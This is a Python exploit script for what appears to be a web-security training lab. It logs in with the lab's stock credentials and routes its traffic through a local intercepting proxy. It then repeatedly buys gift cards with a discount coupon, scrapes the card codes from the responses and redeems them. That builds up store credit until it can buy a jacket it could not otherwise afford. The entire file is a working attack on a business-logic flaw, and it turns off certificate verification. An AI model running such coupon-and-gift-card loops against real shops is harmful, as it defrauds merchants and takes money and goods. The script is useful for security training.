import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {"name": "csrf"})['value']
    return csrf


def buy_jacket(s, url):
    #Retrieve csrf token
    login_url = url + '/login'
    csrf_token = get_csrf_token(s, login_url)

    #Login as user
    print("[+] Logging in as user...")
    data_login = {"csrf": csrf_token, "username": 'wiener', 'password': 'peter'}
    r = s.post(login_url, data=data_login, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        print("[+] Successfully logged in!")

        for i in range(450):

            #Add gift card
            cart_url = url + "/cart"
            add_gift_card = {"productId": "2", "redir": "PRODUCT", "quantity": "1"}
            r = s.post(cart_url, data=add_gift_card, verify=False, proxies=proxies)

            #Redeem gift card
            redeem_coupon_url = url + "/cart/coupon"
            csrf_token = get_csrf_token(s, cart_url)
            redeem_coupon = {"csrf": csrf_token, "coupon": "SIGNUP30"}
            r = s.post(redeem_coupon_url, data=redeem_coupon, verify=False, proxies=proxies)

            #Purchase gift card
            purchase_item_url = url + "/cart/checkout"
            purchase_giftcard = {"csrf": csrf_token}
            r = s.post(purchase_item_url, data=purchase_giftcard, verify=False, proxies=proxies)

            #Extract gift card number
            res = r.text
            gift_card = re.findall('<tr>\n(.*?)<td>(.*?)<\/td>', res)[0][1]
            
            #Add to gift card
            gift_card_url = url + "/gift-card"
            csrf_token = get_csrf_token(s, url + "/my-account")
            apply_gift_card = {"csrf": csrf_token, "gift-card": gift_card}
            r = s.post(gift_card_url, data=apply_gift_card, verify=False, proxies=proxies)

        #Add jacket to cart
        add_jacket = {"productId": "1", "redir": "PRODUCT", "quantity": "1"}
        r = s.post(cart_url, data=add_jacket, verify=False, proxies=proxies)

        #Purchase jacket
        csrf_token = get_csrf_token(s, cart_url)
        purchase_jacket = {"csrf": csrf_token}
        r = s.post(purchase_item_url, data=purchase_jacket, verify=False, proxies=proxies)

        if 'Congratulations' in r.text:
            print("[+]Successfully purchased the jacket!")
        else:
            print("[-] Unable to purchase jacket.")
            sys.exit(-1)

    else:
        print("[-] Could not login as user.")
        sys.exit(-1)



def main():
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url>" % sys.argv[0])
        print("[+] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]

    buy_jacket(s, url)

if __name__ == "__main__":
    main()